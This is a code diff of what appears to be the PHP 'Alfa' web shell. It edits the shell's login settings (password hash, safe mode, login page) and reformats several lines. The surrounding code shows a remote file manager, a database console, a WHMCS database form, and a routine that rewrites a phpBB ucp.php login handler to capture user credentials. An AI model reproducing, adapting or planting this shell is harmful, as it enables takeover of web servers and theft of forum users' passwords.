@@ -1,10 +1,10 @@
 <?php
 
 $GLOBALS['oZgNypoPRU'] = array(
-    'username' => 'admin',
-    'password' => 'd67518449a1740e368f8bc3d028847a5',//md5(ehsan)
-    'safe_mode' => '0',
-    'login_page' => '403',
+    'username' => 'admin	',
+    'password' => '9c983d1fc5500dce0b8f78e698372b8a',//md5(ehsan)
+    'safe_mode' => '1',
+    'login_page' => 'gui',
     'show_icons' => '1',
     'post_encryption' => false,
     'cgi_api' => true,
@@ -1689,7 +1689,7 @@ $table = array('td1' =>
  'td2' =>
  array('color' => 'FFFFFF', 'tdName' => 'db_username : ', 'inputName' => 'db_username', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
  'td3' =>
- array('color' => 'FFFFFF', 'tdName' => 'db_password : ', 'inputName' => 'db_password', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50'),
+ array('color' => 'FFFFFF', 'tdName' => 'db_password : ', 'inputName' => 'db_password', 'id' => 'db_pw', 'inputValue' => '', 'inputSize'=> '50'),
  'td4' =>
  array('color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
  'td5' =>
@@ -2634,8 +2634,7 @@ if($GLOBALS['glob_chdir_false']){
 				echo "<script>alfaShowNotification('".addslashes($_POST['alfa2'])." created...', 'Files manager');</script>";
 			}
 		}else{
-			echo "<script>alfaShowNotification('folder already existed', 'Files manager', 'error');</script>";
-		}
+			echo "<script>alfaShowNotification('folder already existed', 'Files manager', 'error');</script>";}
 	}else{
 		echo "<script>alfaShowNotification('folder isnt writable !', 'Files manager', 'error');</script>";
 	}
@@ -3421,8 +3420,7 @@ $table = array('td1' =>
  'td2' =>
  array('color' => 'FFFFFF', 'tdName' => 'URL', 'inputName' => 'path', 'inputValue' => 'http://site.com/whmcs', 'inputSize' => '50'),
  'td3' =>
- array('color' => 'FFFFFF', 'tdName' => 'File Name', 'inputName' => 'fname', 'inputValue' => '', 'inputSize' => '50'),
- 'td4' =>
+ array('color' => 'FFFFFF', 'tdName' => 'File Name', 'inputName' => 'fname', 'inputValue' => '', 'inputSize' => '50'),'td4' =>
  array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'inputName' => 'dbn', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
  'td5' =>
  array('color' => 'FFFFFF', 'tdName' => 'Db User', 'inputName' => 'dbu', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
@@ -4400,8 +4398,7 @@ foreach($lines as $line){
 				$finded = true;
 			}
 		}
-		if(!$finded){
-			$anonymous_users[] = $owner;
+		if(!$finded){$anonymous_users[] = $owner;
 		}
 	}else{
  		if($state == "named.conf"){
@@ -4743,7 +4740,7 @@ foreach ($database_list as $db_name) {
 	}
 	echo "</div></li>";
 }
-echo "</ul></div><div class='mysql-query-results'><div class='mysql-query-result-tabs'><div class='db-opt-id mysql-query-selected-tab' target='.mysql-query-result-content' onclick='alfaMysqlTabCtl(this);'>Result</div><div class='db-opt-id' target='.mysql-query-form' onclick='alfaMysqlTabCtl(this);'>Query</div><div class='db-opt-id' target='.mysql-search-area' onclick='alfaMysqlTabCtl(this);'>Search</div><div class='db-opt-id' target='.mysql-structure' onclick='alfaMysqlTabCtl(this);'>Structure</div><div class='db-opt-id' target='.mysql-insert-row' onclick='alfaMysqlTabCtl(this);'>Insert</div><div style='display:none;' class='db-opt-id' target='.mysql-edit-row' onclick='alfaMysqlTabCtl(this);'>Edit</div></div><div class='mysql-query-content mysql-insert-row mysql-hide-content'></div><div class='mysql-query-content mysql-edit-row mysql-hide-content'></div><div class='mysql-query-content mysql-search-area mysql-hide-content'></div><div class='mysql-query-content mysql-structure mysql-hide-content'></div><div class='mysql-query-content mysql-query-form mysql-hide-content'><div style='margin-bottom: 5px;'><span>Query:</span></div><textarea name='query' style='width:90%;height:100px'></textarea><p><div style='float:left;margin-left: 30px;'><input class='button db-opt-id' db_target='".$_POST['sql_base']."' onclick='alfaMysqlQuery(this);return false;' type='submit' value=' '></div></p></div><div class='mysql-query-content mysql-query-result-content'><div class='mysql-query-result-header'><div style='margin-bottom: 10px;' class='mysql-query-reporter'></div><div class='mysql-query-pager'></div></div><div class='mysql-query-table'></div></div></form></td></tr>";
+echo "</ul></div><div class='mysql-query-results'><div class='mysql-query-result-tabs'><div class='db-opt-id mysql-query-selected-tab' target='.mysql-query-result-content' onclick='alfaMysqlTabCtl(this);'>Result</div><div class='db-opt-id' target='.mysql-query-form' onclick='alfaMysqlTabCtl(this);'>Query</div><div class='db-opt-id' target='.mysql-search-area' onclick='alfaMysqlTabCtl(this);'>Search</div><div class='db-opt-id' target='.mysql-structure' onclick='alfaMysqlTabCtl(this);'>Structure</div><div class='db-opt-id' target='.mysql-insert-row' onclick='alfaMysqlTabCtl(this);'>Insert</div><div style='display:none;' class='db-opt-id' target='.mysql-edit-row' onclick='alfaMysqlTabCtl(this);'>Edit</div></div><div class='mysql-query-content mysql-insert-row mysql-hide-content'></div><div class='mysql-query-content mysql-edit-row mysql-hide-content'></div><div class='mysql-query-content mysql-search-area mysql-hide-content'></div><div class='mysql-query-content mysql-structure mysql-hide-content'></div><div class='mysql-query-content mysql-query-form mysql-hide-content'><div style='margin-bottom: 5px;'><span>Query:</span></div><textarea name='query' style='width:90%;height:100px'></textarea><p><div style='float:left;margin-left: 30px;'><input class='button db-opt-id' db_target='".$_POST['sql_base']."' onclick='alfaMysqlQuery(this);return false;' type='submit' value=' '></div></p></div><div class='mysql-query-content mysql-query-result-content'><div class='mysql-query-result-header'><div style='margin-bottom: 10px;'class='mysql-query-reporter'></div><div class='mysql-query-pager'></div></div><div class='mysql-query-table'></div></div></form></td></tr>";
 }
 echo "</table></div>";
 echo "</div>";
@@ -5659,8 +5656,7 @@ $code = '$Alfa_u = request_var(\'username\', \'\');$Alfa_p = request_var(\'passw
 $find = 'case \'login\':';
 $code=str_replace('{saveto_path}',$saveto,$code);
 $login=$path."/ucp.php";
-$evil_login = "\t".$find."\n\t".$code;
-if(@is_file($login) AND @is_writable($login)){
+$evil_login = "\t".$find."\n\t".$code;if(@is_file($login) AND @is_writable($login)){
 $data_login = @file_get_contents($login);
 if(strstr($data_login, $find)){
 $login_replace = str_replace($find,$evil_login, $data_login);
@@ -5816,8 +5812,7 @@ function alfaarchive_manager(){
 		echo '<hr><div style="margin-left: 12px;" archive_full="phar://'.$file.'" archive_name="'.basename($file).'" id="archive_dir_'.$rand_id.'" class="archive_dir_holder"><span>PWD: </span><div class="archive_pwd_holder" style="display:inline-block"><a>/</a></div></div>';
 		echo '<div style="padding: 10px;" id="archive_base_'.$rand_id.'">';
 		__alfa_open_archive_file($file, $rand_id);
-		echo '</div>';
-	}
+		echo '</div>';}
 	echo '</div>';
 	alfafooter();
 }
@@ -5956,7 +5951,7 @@ if(@is_readable($dir)){
 if(@is_file($defpage)){
 if($dh = @opendir($dir)){
 echo __pre();
-while (($file = @readdir($dh)) !== false){
+while (($file = @readdir($dh)) !==false){
 if($file == '..' || $file == '.')continue;
 $newfile=$dir.$file;
 if($fCurrent == $newfile)continue;
@@ -6176,7 +6171,7 @@ if (!function_exists('json_encode')){
         $isList = true;
         for ($i = 0, reset($a); $i < count($a); $i++, next($a))
         {
-            if (key($a) !== $i)
+            if (key($a) !==$i)
             {
                 $isList = false;
                 break;
